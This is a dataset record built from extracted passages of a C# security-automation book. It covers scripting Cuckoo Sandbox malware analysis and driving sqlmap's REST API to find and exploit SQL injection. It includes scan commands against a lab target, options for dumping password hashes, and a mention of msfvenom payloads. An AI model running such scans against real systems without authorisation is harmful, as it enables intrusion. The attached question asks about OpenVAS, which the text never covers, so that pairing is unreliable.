a new FileStream() w and then read\nthe file into a byte array. Once the file has been read x, we create a new\nFileParameter class y with the filename, the file bytes, and the content type\napplication/binary.\nThen we set up the HTTP parameters we’ll be sending to Cuckoo\nSandbox in a new Dictionary z. The HTTP parameters are specified in\nthe Cuckoo Sandbox API documentation and should contain the informa-\ntion required to create a task. These parameters allow us to change default\nconfiguration items such as which VM to use {. Finally, we create the new\ntask by calling ExecuteCommand() | with the parameters in the dictionary and\nthen return } the new task ID.\n158 Chapter 8\nThe Task Details and Reporting Methods\nA few more API calls need to be supported in order for us to submit our file\nto be analyzed and reported on, but they are much simpler than CreateTask(),\nas Listing 8-15 details. We just create a method to show the task details, two\nmethods to report on our tasks, and a method to clean up our sessions.\npublic Task uGetTaskDetails(int id)\n{\nstring uri = v\"/tasks/view/\" + id;\nJObject resp = _session.wExecuteCommand(uri, \"GET\");\nxreturn TaskFactory.CreateTask(resp[\"task\"]);\n}\npublic JObject yGetTaskReport(int id)\n{\nreturn GetTaskReport(id, z\"json\");\n}\npublic JObject {GetTaskReport(int id, string type)\n{\nstring uri = |\"/tasks/report/\" + id + \"/\" + type;\nreturn _session.}ExecuteCommand(uri, \"GET\");\n}\npublic void ~Dispose()\n{\n_session = null;\n}\n}\nListing 8-15: Supporting methods for retrieving task information and reports\nThe first method we implement is the GetTaskDetails() method u, which\ntakes a task ID for the variable id as its only argument. We first create the\nURI we’ll make the HTTP request to by appending the ID argument to\n/tasks/view v, and then we call ExecuteCommand() w with the new URI. This\nendpoint returns some information about the task, such as the name of\nthe VM running the task and the task’s current status, which we can use to\nwatch the task until it is finished. Finally, we use the TaskFactory.CreateTask()\nmethod x to turn the JSON task returned by the API into a C# Task class,\nwhich we’ll create in the next section.\nThe second method is a simple convenience method y. Because\nCuckoo Sandbox supports multiple types of reports ( JSON, XML, and\nso on), there are two GetTaskReport() methods, and the first is used only for\nJSON reports. It just accepts the ID of the task you want a report for as an\nargument and calls its overloaded sister method with the same ID passed,\nbut with a second argument specifying that a JSON z report should be\nreturned. In the second GetTaskReport() method {, the task ID and report\ntype are passed as arguments and then used to build the URI | that will\nbe requested in the API call. The new URI is passed to the ExecuteCommand()\nmethod }, and the report from Cuckoo Sandbox is returned.\nAutomating Cuckoo Sandbox 159\nFinally, the Dispose() method ~, which completes the IDisposable inter-\nface, is implemented. This method cleans up the session that we used to\ncommunicate with the API, assigning null to the private _session variable.\nCreating the Task Abstract Class\nSupporting the CuckooSession and CuckooManager classes is the Task class, an\nabstract class that stores most of the relevant information for a given task\nso that the information can easily be accessed as properties. Listing 8-16\ndetails the abstract Task class.\npublic abstract class uTask\n{\nprotected vTask(JToken token)\n{\nif (token != null)\n{\nthis.AddedOn = wDateTime.Parse((string)token[\"added_on\"]);\nif (token[\"completed_on\"].Type != JTokenType.Null)\nthis.CompletedOn = xDateTime.Parse(token[\"completed_on\"].ToObject<string>());\nthis.Machine = (string)token[\"machine\"];\nthis.Errors = token[\"errors\"].ToObject<ArrayList>();\nthis.Custom = (string)token[\"custom\"];\nthis.EnableEnforceTimeout = (bool)token[\"enforce_timeout\"];\nthis.EnableMemoryDump = (bool)token[\"memory\"];\nthis.Guest = token[\"guest\"];\nthis.ID = (int)token[\"id\"];\nthis.Options = token[\"options\"].ToString();\nthis.Package = (string)token[\"package\"];\nthis.Platform = (string)token[\"platform\"];\nthis.Priority = (int)token[\"priority\"];\nthis.SampleID = (int)token[\"sample_id\"];\nthis.Status = (string)token[\"status\"];\nthis.Target = (string)token[\"target\"];\nthis.Timeout = (int)token[\"timeout\"];\n}\n}\npublic string Package { get; set; }\npublic int Timeout { get; set; }\npublic string Options { get; set; }\npublic string Machine { get; set; }\npublic string Platform { get; set; }\npublic string Custom { get; set; }\npublic bool EnableMemoryDump { get; set; }\npublic bool EnableEnforceTimeout { get; set; }\npublic ArrayList Errors { get; set; }\npublic string Target { get; set; }\npublic int SampleID { get; set; }\npublic JToken Guest { get; set; }\npublic int Priority { get; set; }\npublic string Status { get; set; }\n160 Chapter 8\npublic int ID { get; set; }\npublic DateTime AddedOn { get; set; }\npublic DateTime CompletedOn { get; set; }\n}\nListing 8-16: The abstract Task class\nAlthough the abstract Task class u looks complex at first, all the class\nhas is a constructor and a dozen or so properties. The constructor v accepts\na JToken as an argument, which is a special JSON class like JObject. The JToken\nis used to assign all the task details from the JSON to C# properties in the\nclass. The first property we assign with a value in the constructor is the\nAddedOn property. Using DateTime.Parse() w, the timestamp for when the task\nwas created is parsed from a string to a DateTime class, which is assigned to\nAddedOn. The same is done for the CompletedOn property, also using DateTime\n.Parse() x, if the task has been completed. The rest of the properties are\nassigned directly using values from the JSON that was passed as the argu-\nment to the constructor.\nSorting and Creating Different Class Types\nCuckoo Sandbox supports more than one type of task, even though we are\nonly implementing one (the file analysis task). The FileTask class will inherit\nfrom the abstract Task class, but it adds a new property that stores the path\nof the file we want to send to Cuckoo to analyze. The other type of task sup-\nported by Cuckoo is a URL task that opens a given URL in a web browser\nand analyzes what happens (in case there is a drive-by exploit or other mal-\nware on the site).\nCreating the FileTask Class to Make File Analysis Tasks\nThe FileTask class will be used to store the information we need to kick off\nan analysis of a file. It’s short and sweet, as Listing 8-17 shows, since it inher-\nits most of its properties from the Task class we just implemented.\npublic class uFileTask : Task\n{\npublic vFileTask() : base(null) { }\npublic wFileTask(JToken dict) : base(dict) { }\npublic xstring Filepath { get; set; }\n}\nListing 8-17: The FileTask class that inherits from Task\nThe simple FileTask class u, which inherits from the previous Task class,\nuses some advanced inheritance techniques available in C#. The class imple-\nments two different constructors, both of which pass their arguments to the\nbase Task constructor as well. For instance, the first constructor v accepts no\narguments and passes a null value to the base class constructor. This allows\nus to keep a default constructor for the class that doesn’t require any argu-\nments. The second constructor w, which accepts a single JToken class as its\nAutomating Cuckoo Sandbox 161\nonly argument, passes the JSON argument straight to the base constructor,\nwhich will populate the properties the FileTask class inherits from Task. This\nmakes it easy to set up a FileTask using the JSON returned from the Cuckoo\nAPI. The only thing we have in the FileTask class that we don’t have in the\ngeneric Task class is the Filepath property x, which is only useful for submit-\nting file analysis tasks.\nUsing the TaskFactory Class to Determine the Task Type to Create\nJava developers or others familiar with object-oriented programming may\nalready know about the factory pattern used in object-oriented develop-\nment. It is a flexible way to have a single class manage the creation of many\nsimilar but ultimately different types of classes (usually all inheriting from\nthe same base class, but they could also all be implementing the same inter-\nface). The TaskFactory class (shown in Listing 8-18) is used to turn a JSON\ntask returned by Cuckoo Sandbox in an API response into our C# Task class,\nbe it a FileTask or otherwise—that is, if you choose to go the extra step and\nimplement the URL task we described for homework!\npublic static class uTaskFactory\n{\npublic static Task vCreateTask(JToken dict)\n{\nTask task = null;\nwswitch((string)dict[\"category\"])\n{\ncase x\"file\":\ntask = new yFileTask(dict);\nbreak;\ndefault:\nthrow new Exception(\"Don't know category: \" + dict[\"category\"]);\n}\nreturn ztask;\n}\n}\nListing 8-18: The TaskFactory static class, which implements a very simple factory pattern\ncommonly used in object-oriented programming\nThe final class for us to implement is the TaskFactory static class u. This\nclass is the glue that lets us turn JSON tasks from Cuckoo Sandbox into C#\nFileTask objects—and, if you choose to implement other task types in the\nfuture, you can also use TaskFactory to handle the creation of those tasks.\nThe TaskFactory class has only a single static method called CreateTask() v,\nwhich accepts a JToken as its only argument. In the CreateTask() method, we\nuse a switch statement w to test the value of the task category. If the cat-\negory is a file task x, we pass the JToken task to the FileTask constructor y\nand then return the new C# task z. Although we won’t use other file types\nin this book, you can use this switch statement to create a different type of\nTask, such as a url task based on the category, and then return the result.\n162 Chapter 8\nPutting it together\nFinally, we have the scaffolding in place to start automating some malware\nanalysis. Listing 8-19 demonstrates using the CuckooSession and CuckooManager\nclasses to create a file analysis task, watch the task until completion, and\nprint the task’s JSON report to the console.\npublic static void uMain(string[] args)\n{\nCuckooSession session = new vCuckooSession(\"127.0.0.1\", 8090);\nusing (CuckooManager manager = new wCuckooManager(session))\n{\nFileTask task = new xFileTask();\ntask.yFilepath = \"/var/www/payload.exe\";\nint taskID = manager.zCreateTask(task);\nConsole.WriteLine(\"Created task: \" + taskID);\ntask = (FileTask)manager.{GetTaskDetails(taskID);\nwhile(task.Status == \"pending\" || task.Status == \"running\")\n{\nConsole.WriteLine(\"Waiting 30 seconds...\"+task.Status);\nSystem.Threading.Thread.Sleep(30000);\ntask = (FileTask)manager.GetTaskDetails(taskID);\n}\nif (task.|Status == \"failure\")\n{\nConsole.Error.WriteLine(\"There was an error:\");\nforeach (var error in task.Errors)\nConsole.Error.WriteLine(error);\nreturn;\n}\nstring report = manager.}GetTaskReport(taskID).ToString();\nConsole.~WriteLine(report);\n}\n}\nListing 8-19: The Main() method bringing the CuckooSession and CuckooManager classes\ntogether\nIn the Main() method u, we first create a new CuckooSession instance v,\npassing the IP address and the port to connect to when making API requests.\nWith the new session created, in the context of a using statement, we create\na new CuckooManager object w and a new FileTask object x as well. We also\nset the Filepath property y on the task to a path on the filesystem with\nan executable we want to analyze. For testing purposes, you can generate\npayloads with Metasploit’s msfvenom (as we did in Chapter 4) or use some of\nthe payloads we wrote in Chapter 4. With the FileTask set up with the file to\nscan, we pass the task to the manager’s CreateTask() method z and store the\nID returned for later use.\nAutomating Cuckoo Sandbox 163\nOnce the task has been created, we call GetTaskDetails() { and pass the\ntask ID returned by CreateTask(). When we call GetTaskDetails(), a status is\nreturned by the method. In this case, we are interested only in two statuses:\npending and failure. As long as GetTaskDetails() returns a pending status, we\nprint a friendly message to the user that the task is not done yet and have\nthe application sleep for 30 seconds before calling GetTaskDetails() for the\ntask status again. Once the status is no longer pending, we check whether\nthe status is failure | in case something went wrong during analysis. If the\nstatus of the task is failure, we print the error message returned by Cuckoo\nSandbox.\nHowever, if the status is not failure, we can assume the task successfully\ncompleted analysis, and we can create a new report from Cuckoo Sandbox\nwith the findings. We call the GetTaskReport() method }, passing the task ID\nas the only argument, and then print the report to the console screen with\nWriteLine() ~.\ntesting the application\nWith the automation out of the way, we can finally drive our Cuckoo\nSandbox instance to run and analyze a potentially nefarious Windows\nexecutable and then retrieve a report of the task that was run, as shown\nin Listing 8-20. Remember to run the instance as an administrator.\n$ ./ch8_automating_cuckoo.exe\nWaiting 30 seconds...pending\n{\n\"info\": {\n\"category\": \"file\",\n\"score\": 0.0,\n\"package\": \"\",\n\"started\": \"2016-05-19 15:56:44\",\n\"route\": \"none\",\n\"custom\": \"\",\n\"machine\": {\n\"status\": \"stopped\",\n\"name\": \"ucuckoo1\",\n\"label\": \"cuckoo1\",\n\"manager\": \"VirtualBox\",\n\"started_on\": \"2016-05-19 15:56:44\",\n\"shutdown_on\": \"2016-05-19 15:57:09\"\n},\n\"ended\": \"2016-05-19 15:57:09\",\n\"version\": \"2.0-rc2\",\n\"platform\": \"\",\n\"owner\": \"\",\n\"options\": \"\",\n\"id\": 13,\n\"duration\": 25\n},\n\"signatures\": [],\n\"target\": {\n164 Chapter 8\n\"category\": \"file\",\n\"file\": {\n\"yara\": [],\n\"sha1\": \"f145181e095285feeb6897c9a6bd2e5f6585f294\",\n\"name\": \"bypassuac-x64.exe\",\n\"type\": \"PE32+ executable (console) x86-64, for MS Windows\",\n\"sha256\": \"v2a694038d64bc9cfcd8caf6af35b6bfb29d2cb0c95baaeffb2a11cd6e60a73d1\",\n\"urls\": [],\n\"crc32\": \"26FB5E54\",\n\"path\": \"/home/bperry/tmp/cuckoo/storage/binaries/2a694038d2cb0c95baaeffb2a11cd6e60a73d1\",\n\"ssdeep\": null,\n\"size\": 501248,\n\"sha512\":\n\"4b09f243a8fcd71ec5bf146002519304fdbaf99f1276da25d8eb637ecbc9cebbc49b580c51e36c96c8548a41c38cc76\n595ad1776eb9bd0b96cac17ca109d4d88\",\n\"md5\": \"46a695c9a3b93390c11c1c072cf9ef7d\"\n}\n},\n--snip--\nListing 8-20: The Cuckoo Sandbox analysis JSON report\nThe analysis report from Cuckoo Sandbox is huge. It contains highly\ndetailed information about what happened on the Windows system while\nyour executable was running. The listing shows the basic metadata about\nthe analysis, such as what machine ran the analysis u and common hashes\nof the executable v. Once this report is dumped, we can begin to see what\nthe malware did on an infected system and put together a plan for remedia-\ntion and cleanup.\nNote that only part of the report is included here. What is not shown\nis the immense number of Windows API and system calls that were made,\nthe files on the filesystem that were touched, and other incredibly detailed\nsystem information that allows you to more quickly determine what a mal-\nware sample may have done on a client’s machine. More information can be\nfound on what exactly is reported and how to use it on the official Cuckoo\nSandbox documentation site: http://docs.cuckoosandbox.org/en/latest/usage/\nresults/.\nAs an exercise, you can save the full report to a file instead of print-\ning to the console screen, since an output file might be more desirable for\nfuture malware analysis!\nConclusion\nThe Cuckoo Sandbox is a powerful framework for malware analysis, and\nwith the API feature, it can be easily integrated into work processes, infra-\nstructures such as email servers, or even incident response playbooks. With\nthe ability to run both files and arbitrary websites within a sandboxed and\ncontained environment, security professionals can easily and quickly deter-\nmine whether an attacker may have breached the network with a payload or\ndrive-by exploit.\nAutomating Cuckoo Sandbox 165\nIn this chapter, we were able to drive this functionality of Cuckoo\nSandbox programmatically using core C# classes and libraries. We created\na handful of classes to communicate with the API and then created tasks\nand reported on them when they were finished. However, we only imple-\nmented support for doing file-based malware analysis. The classes we built,\nthough, are meant to be extensible so that new types of tasks can be added\nand supported, such as a task that submits a URL to be opened in the web\nbrowser.\nWith such a high-quality and useful framework available freely for all\nto use, anyone could add this functionality to their organization’s security-\ncritical infrastructure and thus easily cut down the time it takes to discover\nand remediate potential breaches on home or enterprise networks.\n166 Chapter 8\n9\nau toMa tinG SQlMaP\nIn this chapter, we make tools to automati-\ncally exploit SQL injection vectors. We use\nsqlmap—a popular utility you’ll learn about\nin this chapter—to first find and then verify\nHTTP parameters vulnerable to SQL injection. After\nthat, we combine that functionality with the SOAP\nfuzzer we created in Chapter 3 to automatically verify any potential SQL\ninjections in the vulnerable SOAP service. sqlmap ships with a REST API,\nmeaning that it uses HTTP GET, PUT, POST, and DELETE requests to\nwork with data and special URIs to reference resources in databases. We\nused REST APIs in Chapter 5 when we automated Nessus.\nThe sqlmap API also uses JSON to read objects in HTTP requests sent\nto the API URLs (known as endpoints in REST parlance). JSON is like XML\nin that it allows two programs to pass data to each other in a standard way,\nbut it’s also much less verbose and lighter weight than XML. Normally,\nsqlmap is used by hand at the command line, but driving the JSON API\nprogrammatically will allow you to automate far more tasks than normal\npentesting tools do, from automatically detecting a vulnerable parameter to\nexploiting it.\nWritten in Python, sqlmap is an actively developed utility available\non GitHub at https://github.com/sqlmapproject/sqlmap/. You can download\nsqlmap using git or by downloading a ZIP file of the current master branch.\nRunning sqlmap requires you to have Python installed (on most Linux dis-\ntributions, this is usually installed by default).\nIf you prefer git, the following command will check out the latest mas-\nter branch:\n$ git clone https://github.com/sqlmapproject/sqlmap.git\nIf you prefer wget, you can download a ZIP archive of the latest master\nbranch, as shown here:\n$ wget https://github.com/sqlmapproject/sqlmap/archive/master.zip\n$ unzip master.zip\nIn order to follow the examples in this chapter, you should also install\na JSON serialization framework such as the open source option Json.NET.\nDownload it from https://github.com/JamesNK/Newtonsoft.Json or use the\nNuGet package manager, available in most C# IDEs. We used this library\nbefore in Chapter 2 and Chapter 5.\nrunning sqlmap\nMost security engineers and pentesters use the Python script sqlmap.py (in\nthe root of the sqlmap project or installed system-wide) to drive sqlmap\nfrom the command line. We will briefly go over how the sqlmap command\nline tool works before jumping into the API. Kali has sqlmap installed so\nthat you can just call sqlmap from anywhere on the system. Although the\nsqlmap command line tool has the same overall functionality as the API, it\nisn’t as easily integrated into other programs without invoking the shell.\nDriving the API programmatically should be safer and more flexible than\njust using the command line tool when integrating with other code.\nnote If you are not running Kali, you may have downloaded sqlmap but not installed it\non the system. You can still use sqlmap without installing it system-wide by chang-\ning to the directory that sqlmap is in and calling the sqlmap.py script directly with\nPython using the following code:\n$ python ./sqlmap.py [.. args ..]\nA typical sqlmap command might look like the code in Listing 9-1.\n$ sqlmap u--method=GET --level=3 --technique=b v--dbms=mysql \\\nw-u \"http://10.37.129.3/cgi-bin/badstore.cgi?searchquery=fdsa&action=search\"\nListing 9-1: A sample sqlmap command to run against BadStore\n168 Chapter 9\nWe won’t cover the output of Listing 9-1 at the moment, but note the\nsyntax of the command. In this listing, the arguments we pass to sqlmap\ntell it that we want it to test a certain URL (hopefully a familiar URL, like\nthe one we tested in Chapter 2 with BadStore). We tell sqlmap to use GET\nas the HTTP method u and to use MySQL v payloads specifically (rather\nthan include payloads for PostgreSQL or Microsoft SQL Server), followed\nby the URL w we want to test. There is only a small subset of arguments\nyou can use with the sqlmap script. If you want to try out other commands\nmanually, you can find more detailed information at https://github.com/\nsqlmapproject/sqlmap/wiki/Usage/. We can use the sqlmap REST API to drive\nthe same functionality as the sqlmap command in Listing 9-1.\nWhen running the sqlmapapi.py API examples, you may need to run\nthe API server differently than with the sqlmap utility since it might not be\ninstalled like the sqlmap.py script, which is callable from the system shell like\non Kali. If you need to download sqlmap in order to use the sqlmap API,\nyou can find it on GitHub (https://github.com/sqlmapproject/sqlmap/).\nThe sqlmap REST API\nOfficial documentation on the sqlmap REST API is a bit bare, but we cover\neverything you need to know to use it efficiently and effectively in this book.\nFirst, run sqlmapapi.py -–server (located in the root of the sqlmap project\ndirectory you downloaded earlier) to start the sqlmap API server listening\nat 127.0.0.1 (on port 8775 by default), as shown in Listing 9-2.\n$ ./sqlmapapi.py --server\n[22:56:24] [INFO] Running REST-JSON API server at '127.0.0.1:8775'..\n[22:56:24] [INFO] Admin ID: 75d9b5817a94ff9a07450c0305c03f4f\n[22:56:24] [DEBUG] IPC database: /tmp/sqlmapipc-34A3Nn\n[22:56:24] [DEBUG] REST-JSON API server connected to IPC database\nListing 9-2: Starting the sqlmap server\nsqlmap has several REST API endpoints that we need to create our\nautomated tool. In order to use sqlmap, we need to create tasks and then\nuse API requests to act on those tasks. Most of the available endpoints use\nGET requests, which are meant to retrieve data. To see what GET API end-\npoints are available, run rgrep \"@get\" . from the root of the sqlmap project\ndirectory, as shown in Listing 9-3. This command lists many of the available\nAPI endpoints, which are special URLs used in the API for certain actions.\n$ rgrep \"@get\" .\nlib/utils/api.py:@get(\"/task/newu\")\nlib/utils/api.py:@get(\"/task/taskid/deletev\")\nlib/utils/api.py:@get(\"/admin/taskid/list\")\nlib/utils/api.py:@get(\"/admin/taskid/flush\")\nlib/utils/api.py:@get(\"/option/taskid/list\")\nlib/utils/api.py:@get(\"/scan/taskid/stopw\")\n--snip--\nListing 9-3: Available sqlmap REST API GET requests\nAutomating sqlmap 169",
    "question": "What is the key concept discussed in the section about automating OpenVAS?",
    "summary": "This chapter explains how to automate SQL injection testing using sqlmap, a popular tool that can find and verify vulnerable HTTP parameters. It also shows how to combine sqlmap's functionality with a SOAP fuzzer to test SQL injection in SOAP services. The sqlmap API uses HTTP requests and JSON to communicate with the tool, making it easier to integrate into programs. The chapter provides code examples to drive the sqlmap API and demonstrates how to use it to automatically detect and exploit SQL injection vulnerabilities. The sqlmap API is a REST-based service that allows for programmatic interaction, and it is used in this chapter to automate tasks like scanning for vulnerabilities and retrieving results."
  },
  {
    "start": 120,
    "end": 133,
    "text": "Soon we’ll cover how to use the API endpoints to create u, stop w, and\ndelete v sqlmap tasks. You can replace @get in this command with @post to\nsee the API’s available endpoints for POST requests. Only three API calls\nrequire an HTTP POST request, as shown in Listing 9-4.\n$ rgrep \"@post\" .\nlib/utils/api.py:@post(\"/option/taskid/get\")\nlib/utils/api.py:@post(\"/option/taskid/set\")\nlib/utils/api.py:@post(\"/scan/taskid/start\")\nListing 9-4: REST API endpoints for POST requests\nWhen using the sqlmap API, we need to create a task to test a given\nURL for SQL injections. Tasks are identified by their task ID, which we\nenter in place of taskid in the API options in Listings 9-3 and 9-4. We can\nuse curl to test the sqlmap server to ensure it is running properly and to get\na feel for how the API behaves and the data it sends back. This will give us a\ngood idea of how our C# code is going to work when we begin writing our\nsqlmap classes.\nTesting the sqlmap API with curl\nNormally, sqlmap is run on the command line using the Python script we\ncovered earlier in this chapter, but the Python commands will hide what\nsqlmap is doing on the backend and won’t give us insight into how each API\ncall will work. To get a feel for using the sqlmap API directly, we’ll use curl,\nwhich is a command line tool generally used to make HTTP requests and\nsee the responses to those requests. For example, Listing 9-5 shows how to\nmake a new sqlmap task by calling to the port sqlmap is listening to.\n$ curl u127.0.0.1:8775/task/new\n{\nv\"taskid\": \"dce7f46a991c5238\",\n\"success\": true\n}\nListing 9-5: Creating a new sqlmap task with curl\nHere, the port is 127.0.0.1:8775 u. This returns a new task ID after the\ntaskid key and a colon v. Make sure that your sqlmap server is running as\nin Listing 9-2 before making this HTTP request.\nAfter making a simple GET request with curl to the /task/new endpoint,\nsqlmap returns a new task ID for us to use. We’ll use this task ID to make\nother API calls later, including starting and stopping the task and getting\nthe task results. To view a list of all scan options for a given task ID available\nfor use with sqlmap, call the /option/taskid/list endpoint and substitute\nthe ID you created earlier, as shown in Listing 9-6. Note we are using the\nsame task ID in the API endpoint request that was returned in Listing 9-5.\nKnowing the options for a task is important for starting the SQL injection\nscan later.\n170 Chapter 9\n$ curl 127.0.0.1:8775/option/dce7f46a991c5238/list\n{\n\"options\": {\n\"crawlDepth\": null,\n\"osShell\": false,\nu\"getUsers\": false,\nv\"getPasswordHashes\": false,\n\"excludeSysDbs\": false,\n\"uChar\": null,\n--snip--\nw\"tech\": \"BEUSTQ\",\n\"textOnly\": false,\n\"commonColumns\": false,\n\"keepAlive\": false\n}\n}\nListing 9-6: Listing the options for a given task ID\nEach of these task options corresponds with a command line argu-\nment from the command line sqlmap tool. These options tell sqlmap how\nit should perform a SQL injection scan and how it should exploit any injec-\ntions it finds. Among the interesting options shown in Listing 9-6 is one for\nsetting the injection techniques (tech) to test for; here it is set to the default\nBEUSTQ to test for all SQL injection types w. You also see options for dump-\ning the user database, which is off in this example u, and dumping pass-\nword hashes, which is also off v. If you are interested in what all the options\ndo, run sqlmap --help at the command line to see the option descriptions\nand usage.\nAfter creating our task and viewing its currently set options, we can set\none of the options and then start a scan. To set specific options, we make a\nPOST request and need to include some data that tells sqlmap what to set\nthe options to. Listing 9-7 details starting a sqlmap scan with curl to test a\nnew URL.\n$ curl u-X POST v-H \"Content-Type:application/json\" \\\nw--data '{\"url\":\"http://10.37.129.3/cgi-bin/badstore.cgi?searchquery=fdsa&action=search\"}' \\\nxhttp://127.0.0.1:8775/scan/dce7f46a991c5238/start\n{\n\"engineid\": 7181,\n\"success\": truey\n}\nListing 9-7: Starting a scan with new options using the sqlmap API\nThis POST request command looks different from the GET request in\nListing 9-5, but it is actually very similar. First, we designate the command\nas a POST request u. Then we list the data to send to the API by placing\nthe name of the option to set in quotes (such as \"url\"), followed by a colon,\nthen the data to set the option to w. We designate the content of the data\nto be JSON using the -H argument to define a new HTTP header v, which\nAutomating sqlmap 171\nensures the Content-Type header will be correctly set to the application/json\nMIME-type for the sqlmap server. Then we start the command with a POST\nrequest using the same API call format as the GET request in Listing 9-6,\nwith the endpoint /scan/taskid/start x.\nOnce the scan has been started and sqlmap reports success y, we need\nto get the scan status. We can do that with a simple curl call using the status\nendpoint, as shown in Listing 9-8.\n$ curl 127.0.0.1:8775/scan/dce7f46a991c5238/status\n{\nu\"status\": \"terminated\",\n\"returncode\": 0,\n\"success\": true\n}\nListing 9-8: Getting the status of a scan\nAfter the scan has finished running, sqlmap will change the status of\nthe scan to terminated u. Once the scan has terminated, we can use the log\nendpoint to retrieve the scan log and see whether sqlmap found anything\nduring the scan, as Listing 9-9 shows.\n$ curl 127.0.0.1:8775/scan/dce7f46a991c5238/log\n{\n\"log\": [\n{\nu\"message\": \"flushing session file\",\nv\"level\": \"INFO\",\nw\"time\": \"09:24:18\"\n},\n{\n\"message\": \"testing connection to the target URL\",\n\"level\": \"INFO\",\n\"time\": \"09:24:18\"\n},\n--snip--\n],\n\"success\": true\n}\nListing 9-9: Making a request for the scan log\nThe sqlmap scan log is an array of statuses that includes the message u,\nmessage level v, and timestamp w for each status. The scan log gives us\ngreat visibility into what happened during a sqlmap scan of a given URL,\nincluding any injectable parameters. Once we are done with the scan and\nhave our results, we should go ahead and clean up to conserve resources.\nTo delete the task we just created when we’re done with it, call /task/taskid/\ndelete, as shown in Listing 9-10. Tasks can be freely created and deleted in\nthe API, so feel free to create new tasks, play around with them, and then\ndelete them.\n172 Chapter 9\n$ curl 127.0.0.1:8775/task/dce7f46a991c5238/deleteu\n{\n\"success\": truev\n}\nListing 9-10: Deleting a task in the sqlmap API\nAfter calling the /task/taskid/delete endpoint u, the API will return the\ntask’s status and whether it was successfully deleted v. Now that we have the\ngeneral workflow of creating, running, and deleting a sqlmap scan, we can\nbegin working on our C# classes to automate the whole process from start\nto finish.\nCreating a Session for sqlmap\nNo authentication is required to use the REST API, so we can easily use\nthe session/manager pattern, which is a simple pattern similar to the other\nAPI patterns in previous chapters. This pattern allows us to separate the\nprotocol’s transport (how we talk to the API) from the protocol’s exposed\nfunctionality (what the API can do). We’ll implement SqlmapSession and\nSqlmapManager classes to drive the sqlmap API to automatically find and\nexploit injections.\nWe’ll begin by writing the SqlmapSession class. This class, shown in\nListing 9-11, requires only a constructor and two methods called ExecuteGet()\nand ExecutePost(). These methods will do most of the heavy lifting of the\ntwo classes we’ll write. They will make the HTTP requests (one for GET\nrequests and one for POST requests, respectively) that allow our classes to\ntalk with the sqlmap REST API.\npublic class uSqlmapSession : IDisposable\n{\nprivate string _host = string.Empty;\nprivate int _port = 8775; //default port\npublic vSqlmapSession(string host, int port = 8775)\n{\n_host = host;\n_port = port;\n}\npublic string wExecuteGet(string url)\n{\nreturn string.Empty;\n}\npublic string xExecutePost(string url, string data)\n{\nreturn string.Empty;\n}\nAutomating sqlmap 173\npublic void yDispose()\n{\n_host = null;\n}\n}\nListing 9-11: The SqlmapSession class\nWe start by creating a public class called SqlmapSession u that will\nimplement the IDisposable interface. This lets us use the SqlmapSession with\na using statement, allowing us to write cleaner code with variables managed\nthrough garbage collection. We also declare two private fields, a host and\na port, which we will use when making our HTTP requests. We assign the\n_host variable a value of string.Empty by default. This is a feature of C# that\nallows you to assign an empty string to a variable without actually instanti-\nating a string object, resulting in a slight performance boost (but for now,\nit’s just to assign a default value). We assign the _port variable the port that\nsqlmap listens on, which is 8775, the default.\nAfter declaring the private fields, we create a constructor that accepts\ntwo arguments v: the host and the port. We assign the private fields the\nvalues that are passed as the parameters to the constructor so we can con-\nnect to the correct API host and port. We also declare two stub methods\nfor executing GET and POST requests that return string.Empty for the time\nbeing. We’ll define these methods next. The ExecuteGet() method w only\nrequires a URL as input. The ExecutePost() method x requires a URL and\nthe data to be posted. Finally, we write the Dispose() method y, which is\nrequired when implementing the IDisposable interface. Within this method,\nwe clean up our private fields by assigning them a value of null.\nCreating a Method to Execute a GET Request\nListing 9-12 shows how to use WebRequest to implement the first of the two\nstubbed methods to execute a GET request and return a string.\npublic string ExecuteGet(string url)\n{\nHttpWebRequest req = (HttpWebRequest)WebRequest.uCreate(\"http://\" + _host + \":\" + _port + url);\nreq.Method = \"GET\";\nstring resp = string.Empty;\nvusing (StreamReader rdr = new StreamReader(req.GetResponse().GetResponseStream()))\nresp = rdr.wReadToEnd();\nreturn resp;\n}\nListing 9-12: The ExecuteGet() method\nWe create a WebRequest u with the _host, _port, and url variables to build\na full URL and then set the Method property to GET. Next, we perform the\nrequest v and read the response into a string with ReadToEnd() w, which is\n174 Chapter 9\nthen returned to the caller method. When you implement SqlmapManager,\nyou’ll use the Json.NET library to deserialize the JSON returned in the\nstring so that you can easily pull values from it. Deserialization is the\nprocess of converting strings into JSON objects, and serialization is the\nopposite process.\nExecuting a POST Request\nThe ExecutePost() method is only slightly more complex than the ExecuteGet()\nmethod. Since ExecuteGet() can only make simple HTTP requests, ExecutePost()\nwill allow us to send complex requests with more data (such as JSON). It will\nalso return a string containing the JSON response that will be deserialized\nby the SqlmapManager. Listing 9-13 shows how to implement the ExecutePost()\nmethod.\npublic string ExecutePost(string url, string data)\n{\nbyte[] buffer = uEncoding.ASCII.GetBytes(data);\nHttpWebRequest req = (HttpWebRequest)WebRequest.Create(\"http://\"+_host+\":\"+_port+url);\nreq.Method = \"POST\"v;\nreq.ContentType = \"application/json\"w;\nreq.ContentLength = buffer.Length;\nusing (Stream stream = req.GetRequestStream())\nstream.xWrite(buffer, 0, buffer.Length);\nstring resp = string.Empty;\nusing (StreamReader r = new StreamReader(req.GetResponse().GetResponseStream()))\nresp = r.yReadToEnd();\nreturn resp;\n}\nListing 9-13: The ExecutePost() method\nThis is very similar to the code we wrote when fuzzing POST requests\nin Chapters 2 and 3. This method expects two arguments: an absolute URI\nand the data to be posted into the method. The Encoding class u (available in\nthe System.Text namespace) is used to create a byte array that represents the\ndata to be posted. We then create a WebRequest object and set it up as we did\nfor the ExecuteGet() method, except we set the Method to POST v. Notice that\nwe also specify a ContentType of application/json w and a ContentLength that\nmatches the length of the byte array. Since we will be sending the server\nJSON data, we need to set the appropriate content type and length of our\ndata in the HTTP request. We write x the byte array to the request TCP\nstream (the connection between your computer and the HTTP server) once\nthe WebRequest is set up, sending the JSON data to the server as the HTTP\nrequest body. Finally, we read y the HTTP response into a string that is\nreturned to the calling method.\nAutomating sqlmap 175\nTesting the Session Class\nNow we are ready to write a small application to test the new SqlmapSession\nclass in the Main() method. We’ll create a new task, call our methods, and\nthen delete the task, as Listing 9-14 shows.\npublic static void Main(string[] args)\n{\nstring host = uargs[0];\nint port = int.Parse(args[1]);\nusing (SqlmapSession session = new vSqlmapSession(host, port))\n{\nstring response = session.wExecuteGet(\"/task/new\");\nJToken token = JObject.Parse(response);\nstring taskID = token.xSelectToken(\"taskid\").ToString();\nyConsole.WriteLine(\"New task id: \" + taskID);\nConsole.WriteLine(\"Deleting task: \" + taskID);\nzresponse = session.ExecuteGet(\"/task/\" + 